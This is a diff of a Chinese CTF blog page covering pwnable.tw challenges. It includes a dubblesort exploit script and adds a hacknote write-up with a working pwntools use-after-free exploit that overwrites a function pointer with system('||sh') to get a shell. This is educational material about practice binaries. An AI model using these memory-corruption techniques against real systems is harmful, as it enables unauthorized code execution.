@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">3,723</span> / Reading time: <span class="post-count">21 min</span></span>
+                        <span>Word count: <span class="post-count">4,150</span> / Reading time: <span class="post-count">23 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -475,7 +475,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[29] .dynamic          DYNAMIC         001afdb0 1aedb0 0000f0 08  WA  5   0  4</span><br><span class="line">[30] .got              PROGBITS        001afea0 1aeea0 000150 04  WA  0   0  4</span><br><span class="line">[31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br><span class="line">[32] .data             PROGBITS        001b0040 1af040 000e94 00  WA  0   0 32</span><br></pre></td></tr></table></figure>
 <h2 id="note3-排序问题"><a href="#note3-排序问题" class="headerlink" title="note3: 排序问题"></a>note3: 排序问题</h2><p>由于所有输入最终会进行排序，为了保证canary位置的值不被改变，从canary之后的值都应该大于canary处存放的值:</p>
 <h2 id="note4-exploit"><a href="#note4-exploit" class="headerlink" title="note4: exploit:"></a>note4: exploit:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;debug?:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./dubblesort&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    libc_off = 0x1b2000</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;, 10101)</span><br><span class="line">    libc = ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    libc_off = 0x1b0000</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;name :&quot;)</span><br><span class="line">p.sendline(&quot;aaaa&quot; * 6)</span><br><span class="line">p.recvuntil(&quot;aa\n&quot;)</span><br><span class="line">libc.address = u32(&quot;\x00&quot; + p.recvn(3)) - libc_off</span><br><span class="line">print &quot;libc.address&quot; + hex(libc.address)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;sort :&quot;)</span><br><span class="line">p.sendline(&quot;35&quot;)</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.recvuntil(&quot; :&quot;)</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot; :&quot;)</span><br><span class="line">p.sendline(&quot;+&quot;)</span><br><span class="line"></span><br><span class="line">sys_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_sh = next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">print &quot;sys&quot; + str(sys_addr)</span><br><span class="line">print &quot;bin&quot; + str(bin_sh)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    p.recvuntil(&quot; :&quot;)</span><br><span class="line">    p.sendline(str(sys_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot; :&quot;)</span><br><span class="line">p.sendline(str(sys_addr))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(sys_addr))</span><br><span class="line">p.recvuntil(&quot; :&quot;)</span><br><span class="line">p.sendline(str(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+<h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><p>本题的漏洞在于释放堆的时候，没有清0，可能导致UAF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( note_ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free((void *)note_ptr[v1]-&gt;content_address);// 没有清0</span><br><span class="line">    free(note_ptr[v1]);                         // 没有清0</span><br><span class="line">    puts(&quot;Success&quot;);</span><br></pre></td></tr></table></figure>
+<p>思路就是通过修改<code>note_ptr[v1]-&gt;puts_address</code>为<code>system</code>函数，这样打印内容的时候，就会启动一个shell.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_80488A5()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= note_number_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( note_ptr[v1] )</span><br><span class="line">    ((void (__cdecl *)(note *))note_ptr[v1]-&gt;puts_address)(note_ptr[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意，<code>note_ptr[v1]</code>就是<code>system</code>函数本身的地址，无法改变，可以通过”||sh”来绕过。<code>system(&quot;abcd||sh&quot;)</code>也是可以启动一个shell。此外，泄露的地址和libc的偏移不一致，需要注意。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/hacknote$ cat solve.py </span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;debug?:&quot;))</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">#    p = process(&quot;./hacknote&quot;, env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc_32.so.6&quot;&#125;)</span><br><span class="line">#    libc = ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">    p = process(&quot;./hacknote&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">    offset = 0x1b270a</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">    libc = ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">    offset = 0x1b070a</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, str(size))</span><br><span class="line">    p.sendafter(&quot;:&quot;, content)</span><br><span class="line">    if size == 0x5:</span><br><span class="line">        p.sendline(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, &quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, &quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;:&quot;, str(index))</span><br><span class="line"></span><br><span class="line"># leak libc address</span><br><span class="line">add(0x100, &quot;a\n&quot;)    # 0</span><br><span class="line">add(0x8, &quot;b\n&quot;)   # 1</span><br><span class="line">delete(0)</span><br><span class="line">add(0x100, &quot;\n&quot;)  # 2</span><br><span class="line">show(2)</span><br><span class="line">libc.address = u32(p.recvn(4)) - offset</span><br><span class="line">print &quot;libc.address:&quot;, hex(libc.address)</span><br><span class="line"></span><br><span class="line"># modify put_address</span><br><span class="line">add(0x8, &quot;d\n&quot;)      # 3</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">if debug:</span><br><span class="line">    attach(p)</span><br><span class="line">add(0x8, p32(libc.symbols[&apos;system&apos;]) + &quot;||sh&quot;) #4</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Silver-Bullet"><a href="#Silver-Bullet" class="headerlink" title="Silver Bullet"></a>Silver Bullet</h1>
     </article>
     <!-- license  -->
     
@@ -613,7 +619,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rop不需要leak"><span class="toc-number">3.1.</span> <span class="toc-text">rop不需要leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop需要leak"><span class="toc-number">3.2.</span> <span class="toc-text">rop需要leak</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dubblesort"><span class="toc-number">4.</span> <span class="toc-text">dubblesort</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#note1-本题核心在于scanf函数"><span class="toc-number">4.1.</span> <span class="toc-text">note1. 本题核心在于scanf函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note2-关于vmmap的问题："><span class="toc-number">4.2.</span> <span class="toc-text">note2. 关于vmmap的问题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note3-排序问题"><span class="toc-number">4.3.</span> <span class="toc-text">note3: 排序问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note4-exploit"><span class="toc-number">4.4.</span> <span class="toc-text">note4: exploit:</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rop不需要leak"><span class="toc-number">3.1.</span> <span class="toc-text">rop不需要leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop需要leak"><span class="toc-number">3.2.</span> <span class="toc-text">rop需要leak</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dubblesort"><span class="toc-number">4.</span> <span class="toc-text">dubblesort</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#note1-本题核心在于scanf函数"><span class="toc-number">4.1.</span> <span class="toc-text">note1. 本题核心在于scanf函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note2-关于vmmap的问题："><span class="toc-number">4.2.</span> <span class="toc-text">note2. 关于vmmap的问题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note3-排序问题"><span class="toc-number">4.3.</span> <span class="toc-text">note3: 排序问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#note4-exploit"><span class="toc-number">4.4.</span> <span class="toc-text">note4: exploit:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hacknote"><span class="toc-number">5.</span> <span class="toc-text">hacknote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Silver-Bullet"><span class="toc-number">6.</span> <span class="toc-text">Silver Bullet</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1771,124 +1777,9 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 76
+        Total : 75
         </div>
         <!-- search  -->
         
@@ -1929,11 +1820,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/posts/49664/">xmasctf</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/posts/58144/">tp5.x渗透测试</a>
         </li>
     
     
@@ -2103,12 +1989,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
         </li>
     
     
@@ -2213,12 +2099,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -2296,23 +2182,23 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
